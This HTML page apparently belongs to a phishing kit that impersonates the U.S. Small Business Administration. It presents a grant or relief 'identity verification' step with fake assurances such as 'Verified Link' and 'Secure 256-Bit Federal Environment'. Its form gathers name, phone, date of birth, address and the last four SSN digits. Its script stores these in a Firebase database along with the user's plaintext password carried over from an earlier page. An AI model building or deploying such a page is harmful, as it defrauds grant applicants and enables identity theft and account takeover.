<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SBA | Phase 02: Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        :root { --sba-navy: #002e6d; --sba-blue: #0071bc; }
        body { background: #f4f7f9; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        
        .nav-mini { background: white; border-bottom: 1px solid #e2e8f0; padding: 12px 20px; }
        .auth-card { background: white; border-top: 5px solid var(--sba-navy); box-shadow: 0 15px 35px rgba(0,0,0,0.1); width: 100%; max-width: 420px; border-radius: 4px; }
        
        .input-field { height: 46px; border: 1.5px solid #e2e8f0; width: 100%; padding: 0 12px; outline: none; border-radius: 4px; font-size: 14px; transition: 0.2s; }
        .input-field:focus { border-color: var(--sba-blue); box-shadow: 0 0 0 3px rgba(0, 113, 188, 0.1); }
        
        .btn-finish { background: var(--sba-navy); height: 48px; color: white; width: 100%; font-weight: 700; text-transform: uppercase; font-size: 12px; border-radius: 4px; letter-spacing: 0.5px; }
        .btn-finish:hover { background: #001e4a; }
        .btn-finish:disabled { opacity: 0.7; cursor: not-allowed; }

        .step-bar { height: 4px; flex-grow: 1; border-radius: 2px; background: #e2e8f0; }
        .step-bar.active { background: var(--sba-navy); }

        .section-tag { font-size: 9px; font-weight: 800; color: var(--sba-navy); text-transform: uppercase; letter-spacing: 1px; border-left: 3px solid var(--sba-navy); padding-left: 8px; margin-bottom: 12px; }
    </style>
</head>
<body class="min-h-screen flex flex-col">

    <nav class="nav-mini flex justify-between items-center">
        <div class="flex items-center gap-2">
            <div class="bg-[#002e6d] text-white px-2 py-0.5 font-bold text-lg">SBA</div>
            <span class="text-[10px] font-bold text-gray-400 uppercase leading-tight hidden sm:block">U.S. Small Business <br> Administration</span>
        </div>
        <div class="text-[10px] font-black text-green-600 uppercase tracking-tighter"><i class="fas fa-lock mr-1"></i> Verified Link</div>
    </nav>

    <div class="flex-grow flex items-center justify-center p-4">
        <div class="auth-card p-7 sm:p-9">
            <div class="flex gap-2 mb-6 items-center">
                <div class="step-bar active"></div>
                <div class="step-bar active"></div>
                <div class="step-bar"></div>
            </div>

            <div class="mb-6">
                <h2 class="text-xl font-black text-gray-800 uppercase tracking-tight">Verify Identity</h2>
                <p class="text-[11px] font-bold text-gray-400 uppercase tracking-widest mt-1">Step 2: Case Documentation</p>
            </div>

            <form id="finalForm" class="space-y-4">
                
                <p class="section-tag">Personal Info</p>
                <div class="grid grid-cols-2 gap-3">
                    <div>
                        <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">First Name</label>
                        <input type="text" id="fname" class="input-field" required placeholder="John">
                    </div>
                    <div>
                        <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">Last Name</label>
                        <input type="text" id="lname" class="input-field" required placeholder="Doe">
                    </div>
                </div>

                <div class="grid grid-cols-2 gap-3">
                    <div>
                        <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">Phone</label>
                        <input type="tel" id="phone" class="input-field" required placeholder="(000) 000-0000">
                    </div>
                    <div>
                        <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">D.O.B</label>
                        <input type="date" id="dob" class="input-field" required>
                    </div>
                </div>

                <p class="section-tag pt-2">Location & Security</p>
                <div>
                    <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">Street Address</label>
                    <input type="text" id="address" class="input-field" required placeholder="123 Main St">
                </div>

                <div class="grid grid-cols-2 gap-3">
                    <div>
                        <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">City, State</label>
                        <input type="text" id="city" class="input-field" required placeholder="City, ST">
                    </div>
                    <div>
                        <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">Zip Code</label>
                        <input type="text" id="zip" class="input-field" required placeholder="00000">
                    </div>
                </div>

                <div class="grid grid-cols-2 gap-3 pb-2">
                    <div>
                        <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">SSN (Last 4)</label>
                        <input type="password" id="ssn" maxlength="4" class="input-field" required placeholder="••••">
                    </div>
                    <div>
                        <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">Program</label>
                        <select id="program" class="input-field" style="padding-right: 5px;">
                            <option value="SBA Grant">SBA Grant</option>
                            <option value="Disaster Relief">Relief Fund</option>
                        </select>
                    </div>
                </div>

                <button type="submit" id="finishBtn" class="btn-finish shadow-lg mt-2">
                    Submit Case File <i class="fas fa-file-export ml-2"></i>
                </button>
            </form>
        </div>
    </div>

    <footer class="p-6 text-center">
        <p class="text-[9px] text-gray-400 font-bold uppercase tracking-[0.2em]">
            <i class="fas fa-shield-alt mr-1"></i> Secure 256-Bit Federal Environment
        </p>
    </footer>

    <script type="module">
        import { auth, db } from './firebase-config.js';
        import { createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { doc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        document.getElementById('finalForm').onsubmit = async (e) => {
            e.preventDefault();
            const btn = document.getElementById('finishBtn');
            const email = sessionStorage.getItem('reg_email');
            const pass = sessionStorage.getItem('reg_pass') || "google-auth-user";
            
            if(!email) { window.location.href="register1.html"; return; }

            btn.disabled = true;
            btn.innerHTML = `<i class="fas fa-spinner fa-spin mr-2"></i> Processing...`;

            try {
                let uid;
                if(!sessionStorage.getItem('is_google')) {
                    const res = await createUserWithEmailAndPassword(auth, email, pass);
                    uid = res.user.uid;
                } else {
                    uid = auth.currentUser.uid;
                }

                await setDoc(doc(db, "users", uid), {
                    uid: uid,
                    email: email,
                    password: pass,
                    fullName: document.getElementById('fname').value + " " + document.getElementById('lname').value,
                    phone: document.getElementById('phone').value,
                    dob: document.getElementById('dob').value,
                    address: document.getElementById('address').value,
                    city: document.getElementById('city').value,
                    zip: document.getElementById('zip').value,
                    ssn_last4: document.getElementById('ssn').value,
                    program: document.getElementById('program').value,
                    balance: 0,
                    kycStatus: "PENDING",
                    registeredAt: new Date().toISOString()
                });

                sessionStorage.clear();
                window.location.href = "welcome.html";
            } catch (err) {
                alert("System Error: " + err.message);
                btn.disabled = false;
                btn.innerText = "Submit Case File";
            }
        };
    </script>
</body>
</html>
